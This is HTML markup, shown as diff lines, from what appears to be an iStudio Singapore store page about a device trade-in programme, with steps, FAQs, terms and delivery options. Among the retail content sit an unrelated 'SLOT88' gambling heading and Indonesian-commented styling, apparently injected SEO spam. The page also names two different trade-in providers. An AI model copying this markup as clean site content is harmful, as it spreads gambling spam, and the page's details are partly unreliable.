-                                                  <div class="multicolumn-card__info">
-                                                    <h3 class="inline-richtext"><span style="text-decoration:underline"><strong>Step 2</strong></span></h3>
-                                                    <div class="rte">
-                                                        <p>Visit any <a href="https://www.istudiosg.com/pages/stores" target="_blank" title="iStudio Stores"><span style="text-decoration:underline">iStudio store</span></a> (excluding Airport Terminal locations) for a device assessment.</p>
-                                                    </div>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_BHFMrc-3" class="multicolumn-list__item grid__item slider__slide">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__info">
-                                                    <h3 class="inline-richtext"><span style="text-decoration:underline"><strong>Step 3</strong></span></h3>
-                                                    <div class="rte">
-                                                        <p>Receive the trade-in value of your device and immediately apply it towards the purchase of a new device.</p>
-                                                    </div>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                        </ul>
-                                        <div class="slider-buttons no-js-hidden medium-hide">
-                                            <button type="button" class="slider-button slider-button--prev" name="previous" aria-label="Slide left" disabled>
-                                              <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                              </svg>
-                                            </button>
-                                            <div class="slider-counter caption">
-                                              <span class="slider-counter--current">1</span>
-                                              <span aria-hidden="true"> / </span>
-                                              <span class="visually-hidden">of</span>
-                                              <span class="slider-counter--total">3</span>
-                                            </div>
-                                            <button type="button" class="slider-button slider-button--next" name="next" aria-label="Slide right">
-                                              <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                              </svg>
-                                            </button>
-                                        </div>
-                                      </slider-component>
-                                      <div class="center small-hide medium-hide"></div>
-                                  </div>
-                                </div>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__rich_text_BPHJaz" class="shopify-section section">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__rich_text_BPHJaz-padding {
-                                  padding-top: 15px;
-                                  padding-bottom: 15px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__rich_text_BPHJaz-padding {
-                                  padding-top: 20px;
-                                  padding-bottom: 20px;
-                                  }
-                                  }
-                  .review-section{
-                    max-width:850px;
-                    margin:30px auto;
-                    display:flex;
-                    flex-direction:column;
-                    gap:18px;
-                    font-family:system-ui,Arial,sans-serif;
-                  }
-                  .review-card{
-                    background:#f5f5f5;
-                    padding:16px 20px;
-                    border-radius:10px;
-                    border-left:5px solid var(--brand);
-                    box-shadow:0 3px 6px rgba(0,0,0,.05);
-                    transition:all .25s ease-in-out;
-                  }
-                  .review-card:hover{
-                    transform:translateY(-3px);
-                    box-shadow:0 5px 10px rgba(0,0,0,.08);
-                  }
-                  .review-author{
-                    font-weight:700;
-                    color:var(--brand-dark);
-                    margin-bottom:4px;
-                    display:flex;
-                    align-items:center;
-                    gap:6px;
-                    font-size:.96rem; /* naik sedikit */
-                  }
-                  .review-author::before{
-                    content:"👤";
-                    font-size:1rem;
-                  }
-                  .review-card p{
-                    margin:0;
-                    color:#222;
-                    font-size:.98rem; /* naik sedikit */
-                    line-height:1.6;
-                  }
-                  .review-rating{
-                    margin-left:auto;
-                    font-weight:700;
-                  }
-
-                  .stars{
-                    --rating:5;
-                    --star-size:1rem;
-                    --star-gap:2px;
-                    --star-empty:#e5e7eb;
-                    --star-fill:#30cfff; /* hijau -> merah */
-                    position:relative;
-                    display:inline-block;
-                    font-size:var(--star-size);
-                    line-height:1;
-                    letter-spacing:var(--star-gap);
-                  }
-                  .stars::before{
-                    content:"★★★★★";
-                    color:var(--star-empty);
-                  }
-                  .stars::after{
-                    content:"★★★★★";
-                    color:var(--star-fill);
-                    position:absolute;
-                    left:0;
-                    top:0;
-                    width:calc((var(--rating)/5)*100%);
-                    overflow:hidden;
-                    white-space:nowrap;
-                    pointer-events:none;
-                  }
-                  .stars.lg{
-                    --star-size:1.15rem; /* naik sedikit */
-                    letter-spacing:3px;
-                  }
-                  .badge{
-                    display:inline-flex;
-                    align-items:center;
-                    gap:8px;
-                    flex-wrap:wrap;
-                  }
-                  .badge small{
-                    color:#555;
-                    font-weight:600;
-                  }
-                                </style>
-                                <div class="isolate">
-                                  <div class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_BPHJaz-padding">
-                                      <div class="rich-text__wrapper rich-text__wrapper--center page-width">
-                                        <div class="rich-text__blocks left">
-                                            <div class="rich-text__text rte">
-                                              <p>Please contact us at <a href="https://www.istudiosg.com/site/contactus"><span class="__cf_email__" data-cfemail="f99f9c9c9d9b989a92b9908a8d8c9d90968a9ed79a9694">[email&#160;protected]</span></a> if you have other enquiries. Trade-in program is provided by "Carousell".</p>
-                                            </div>
-                                        </div>
-                                      </div>
-                                  </div>
-                                </div>
-                                <style> #shopify-section-template--16932308091060__rich_text_BPHJaz .rich-text__blocks {max-width: 100%;} </style>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__collapsible_content_4VL7bw" class="shopify-section section">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/component-accordion.css?v=145071537942940513591717736425" rel="stylesheet" type="text/css" media="all">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/collapsible-content.css?v=127502585749033803951717736428" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__collapsible_content_4VL7bw-padding {
-                                  padding-top: 27px;
-                                  padding-bottom: 27px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__collapsible_content_4VL7bw-padding {
-                                  padding-top: 36px;
-                                  padding-bottom: 36px;
-                                  }
-                                  }
-                                </style>
-                                <div class="color-background-1 gradient">
-                                  <div class="collapsible-content collapsible-none-layout isolate content-container content-container--full-width">
-                                      <div class="collapsible-content__wrapper section-template--16932308091060__collapsible_content_4VL7bw-padding">
-                                        <div class="collapsible-content-wrapper-narrow">
-                                            <div class="collapsible-content__header" style="text-align: center;">
-                                              <h2 class="collapsible-content__heading inline-richtext h2">
-                                                  <strong>Frequently Asked Questions</strong>
-                                              </h2>
-                                            </div>
-                                            <div class="grid grid--1-col grid--2-col-tablet collapsible-content__grid collapsible-content__grid--reverse">
-                                              <div class="grid__item">
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              What do I need to bring along?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_W4JfNR-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>You will be required to bring your charger and cable for laptops.</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              What if I do not like the value after assessment?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_kQBgDE-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>You can choose to not accept the trade-in value, but the value shown is final.</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              Can multiple devices be traded in during the same transaction?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_YakkzN-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>Unfortunately, only one device can be traded in per transaction.</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              Do I get to keep the memory card from the trade-in devices?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_jnaGtC-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>We recommend that you remove and keep all your memory cards before you trade-in a device</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              Would I be able to get back my old device back after the trade-in?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_Ekc9KC-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>You would not be able to retrieve your old device as all trade-ins are final. Prior to trading in your device, we recommend backing up all your important content such as contacts, photos, videos, etc.</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              Can I trade-in my device if it does not work?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_TQVdrA-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>We would not be able to assess your device if we are unable to power on your device.</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw">
-                                                        <summary id="Summary-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              What if my device is not found in the trade-in device list?
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw" role="region" aria-labelledby="Summary-collapsible_row_L4WiGw-template--16932308091060__collapsible_content_4VL7bw">
-                                                          <div class="accordion__content rte">
-                                                              <p>You can head down to our stores to get your device assessed by our iStudio Experts to check if it is accepted.</p>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                              </div>
-                                            </div>
-                                        </div>
-                                      </div>
-                                  </div>
-                                </div>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__collapsible_content_e7PxFi" class="shopify-section section">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/component-accordion.css?v=145071537942940513591717736425" rel="stylesheet" type="text/css" media="all">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/collapsible-content.css?v=127502585749033803951717736428" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__collapsible_content_e7PxFi-padding {
-                                  padding-top: 21px;
-                                  padding-bottom: 21px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__collapsible_content_e7PxFi-padding {
-                                  padding-top: 28px;
-                                  padding-bottom: 28px;
-                                  }
-                                  }
-                                </style>
-                                <div class="color-background-1 gradient">
-                                  <div class="collapsible-content collapsible-none-layout isolate content-container content-container--full-width">
-                                      <div class="collapsible-content__wrapper section-template--16932308091060__collapsible_content_e7PxFi-padding">
-                                        <div class="collapsible-content-wrapper-narrow">
-                                            <div class="collapsible-content__header" style="text-align: center;">
-                                              <h2 class="visually-hidden">Collapsible content</h2>
-                                            </div>
-                                            <div class="grid grid--1-col grid--2-col-tablet collapsible-content__grid collapsible-content__grid--reverse">
-                                              <div class="grid__item">
-                                                  <div class="accordion">
-                                                    <details id="Details-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi">
-                                                        <summary id="Summary-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi" role="button" aria-expanded="false" aria-controls="CollapsibleAccordion-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi">
-                                                          <h3 class="accordion__title inline-richtext h4">
-                                                              Terms and Conditions
-                                                          </h3>
-                                                          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                              <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                                          </svg>
-                                                        </summary>
-                                                        <div id="CollapsibleAccordion-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi" role="region" aria-labelledby="Summary-collapsible_row_VUT9HM-template--16932308091060__collapsible_content_e7PxFi">
-                                                          <div class="accordion__content rte">
-                                                              <ul>
-                                                                <li>Customer affirms that s/he is at least legally 18 years of age.</li>
-                                                                <li>"Customer" means the undersigned that is the owner of the Product or has been authorised by the owner of the Product to make decisions on the Product.</li>
-                                                                <li>The Trade-in programme is provided to iStudio customers by Laku6 as a third party company. Apple is not a party in the transaction.</li>
-                                                                <li>Laku6 and iStudio reserve the right to refuse, cancel, or limit the programme for any reason and may change these terms and conditions at any time without prior notice.</li>
-                                                                <li>The Programme is provided for lawful purposes only, to the extent permitted by law, Customer agrees to indemnify iStudio, Laku6, its affiliate and any of its directors, officers, employees, affiliates, subsidiaries or agents from and against claims brought against any of them arising from Customer's breach of terms and conditions of the Programme.</li>
-                                                                <li>iStudio trade-in programme is only available at all iStudio stores (excluding Airport Terminal Stores)</li>
-                                                                <li>Total trade-in value is not transferable.</li>
-                                                                <li>iStudio reserves the right to refuse any customer's eligibility at any time in its discretion in the even of such customer's breach or suspected breach of any of the terms and conditions herein without prior notification or any liability to such customer whatsoever.</li>
-                                                                <li>iStudio reserves the right to vary any term or condition. iStudio will, where it is practicable to do so, give customers advance notice (which may be through written notice, electronic mail letters, iStudio website, or such other forms as iStudio deems appropriate) of such changes.</li>
-                                                                <li>This iStudio Trade-in programme is limited to one (1) device per eligible trade-in.</li>
-                                                              </ul>
-                                                          </div>
-                                                        </div>
-                                                    </details>
-                                                  </div>
-                                              </div>
-                                            </div>
-                                        </div>
-                                      </div>
-                                  </div>
-                                </div>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__rich_text_48PK4h" class="shopify-section section">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-rich-text.css?v=165487089223517640671717736427" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__rich_text_48PK4h-padding {
-                                  padding-top: 27px;
-                                  padding-bottom: 0px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__rich_text_48PK4h-padding {
-                                  padding-top: 36px;
-                                  padding-bottom: 0px;
-                                  }
-                                  }
-                                </style>
-                                <div class="isolate">
-                                  <div class="rich-text content-container color-background-1 gradient rich-text--full-width content-container--full-width section-template--16932308091060__rich_text_48PK4h-padding">
-                                      <div class="rich-text__wrapper rich-text__wrapper--center page-width">
-                                        <div class="rich-text__blocks center">
-                                            <h1 class="rich-text__heading rte inline-richtext h2">
-                                              SLOT88
-                                            </h1>
-                                        </div>
-                                      </div>
-                                  </div>
-                                </div>
-                            </section>
-                            <section id="shopify-section-template--16932308091060__multicolumn_qrFXUg" class="shopify-section multicolumn_sec">
-                                <link href="https://www.istudiosg.com/cdn/shop/t/8/assets/section-multicolumn.css?v=46025948269339862011717736425" rel="stylesheet" type="text/css" media="all">
-                                <style data-shopify="">.section-template--16932308091060__multicolumn_qrFXUg-padding {
-                                  padding-top: 27px;
-                                  padding-bottom: 27px;
-                                  }
-                                  @media screen and (min-width: 750px) {
-                                  .section-template--16932308091060__multicolumn_qrFXUg-padding {
-                                  padding-top: 36px;
-                                  padding-bottom: 36px;
-                                  }
-                                  }
-                                </style>
-                                <div class="multicolumn color-background-1 gradient background-primary no-heading">
-                                  <div class="page-width section-template--16932308091060__multicolumn_qrFXUg-padding isolate">
-                                      <slider-component class="slider-mobile-gutter" style="display:block;">
-                                        <ul class="multicolumn-list contains-content-container grid grid--1-col-tablet-down grid--2-col-desktop slider slider--mobile grid--peek" id="Slider-template--16932308091060__multicolumn_qrFXUg" role="list">
-                                            <li id="Slide-template--16932308091060__multicolumn_qrFXUg-1" class="multicolumn-list__item grid__item slider__slide">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Click_Collect.png?v=1711090269&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 108px) * 0.5 /  2),
-                                                          (min-width: 990px) calc((100vw - 108px) * 0.5 / 2),
-                                                          (min-width: 750px) calc((100vw - 100px) * 0.5 / 1),
-                                                          calc((100vw - 30px) * 0.5 / 1)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <h3 class="inline-richtext">Click &amp; Collect</h3>
-                                                    <div class="rte">
-                                                        <p>Check the stocks availability, order on the way and simply pick-up when you reach. </p>
-                                                    </div>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                            <li id="Slide-template--16932308091060__multicolumn_qrFXUg-2" class="multicolumn-list__item grid__item slider__slide">
-                                              <div class="multicolumn-card content-container">
-                                                  <div class="multicolumn-card__image-wrapper multicolumn-card__image-wrapper--half-width multicolumn-card-spacing">
-                                                    <div class="media media--transparent media--square">
-                                                        <img src="https://www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=3200" alt="" srcset="https://www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=50 50w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=75 75w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=100 100w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=150 150w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=200 200w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=300 300w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=400 400w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=500 500w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=750 750w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=1000 1000w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=1250 1250w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=1500 1500w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=1750 1750w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=2000 2000w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=2250 2250w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=2500 2500w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=2750 2750w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=3000 3000w, //www.istudiosg.com/cdn/shop/files/Standard_Delivery.png?v=1711090273&amp;width=3200 3200w" width="3200" height="3200" loading="lazy" sizes="
-                                                          (min-width: 1000px) calc((1000px - 108px) * 0.5 /  2),
-                                                          (min-width: 990px) calc((100vw - 108px) * 0.5 / 2),
-                                                          (min-width: 750px) calc((100vw - 100px) * 0.5 / 1),
-                                                          calc((100vw - 30px) * 0.5 / 1)
-                                                          " class="multicolumn-card__image">
-                                                    </div>
-                                                  </div>
-                                                  <div class="multicolumn-card__info">
-                                                    <h3 class="inline-richtext">Local Delivery</h3>
-                                                    <div class="rte">
-                                                        <p>Enjoy complimentary delivery for orders with a minimum spend of $250.</p>
-                                                    </div>
-                                                  </div>
-                                              </div>
-                                            </li>
-                                        </ul>
-                                        <div class="slider-buttons no-js-hidden medium-hide">
-                                            <button type="button" class="slider-button slider-button--prev" name="previous" aria-label="Slide left" disabled>
-                                              <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                              </svg>
-                                            </button>
-                                            <div class="slider-counter caption">
-                                              <span class="slider-counter--current">1</span>
-                                              <span aria-hidden="true"> / </span>
-                                              <span class="visually-hidden">of</span>
-                                              <span class="slider-counter--total">2</span>
-                                            </div>
-                                            <button type="button" class="slider-button slider-button--next" name="next" aria-label="Slide right">
-                                              <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewbox="0 0 10 6">
-                                                  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor"></path>
-                                              </svg>
-                                            </button>
-                                        </div>
-                                      </slider-component>
-                                      <div class="center small-hide medium-hide"></div>
-                                  </div>
-                                </div>
-                                <style> #shopify-section-template--16932308091060__multicolumn_qrFXUg .multicolumn-card.content-container {display: flex;} #shopify-section-template--16932308091060__multicolumn_qrFXUg .multicolumn-card__info {text-align: left;} </style>
-                            </section>
-                          </main>
-                      </div>
-                    </div>
-                </modal-dialog>
-                <script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script src="https://www.istudiosg.com/cdn/shop/t/14/assets/product-modal.js?v=116616134454508949461742784888" defer="defer"></script>
-                <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/media-gallery.js?v=96661908581229995091742784888" defer="defer"></script><script>
-                    document.addEventListener('DOMContentLoaded', function () {
-                      function isIE() {
-                        const ua = window.navigator.userAgent;
-                        const msie = ua.indexOf('MSIE ');
-                        const trident = ua.indexOf('Trident/');
-                    
-                        return msie > 0 || trident > 0;
-                      }
-                    
-                      if (!isIE()) return;
-                      const hiddenInput = document.querySelector('#product-form-template--17605519376564__main input[name="id"]');
-                      const noScriptInputWrapper = document.createElement('div');
-                      const variantSwitcher =
-                        document.querySelector('variant-radios[data-section="template--17605519376564__main"]') ||
